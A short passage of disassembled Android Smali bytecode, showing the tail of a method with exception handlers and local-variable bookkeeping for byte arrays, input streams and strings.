    .restart local v18    # "i3":I
    .restart local v23    # "is3":Ljava/io/InputStream;
    .restart local v27    # "s1":Ljava/lang/String;
    .restart local v30    # "s2":Ljava/lang/String;
    :catch_12
    move-exception v10

    move-object/from16 v29, v30

    .end local v30    # "s2":Ljava/lang/String;
    .restart local v29    # "s2":Ljava/lang/String;
    goto :goto_e

    .line 44
    .end local v4    # "b3":[B
    .end local v18    # "i3":I
    .end local v23    # "is3":Ljava/io/InputStream;
    .end local v27    # "s1":Ljava/lang/String;
    .restart local v3    # "b2":[B
    .restart local v17    # "i2":I
    .restart local v22    # "is2":Ljava/io/InputStream;
    .restart local v28    # "s1":Ljava/lang/String;
    :catch_13
    move-exception v9

    move-object/from16 v27, v28

    .end local v28    # "s1":Ljava/lang/String;
    .restart local v27    # "s1":Ljava/lang/String;
    goto/16 :goto_c
.end method
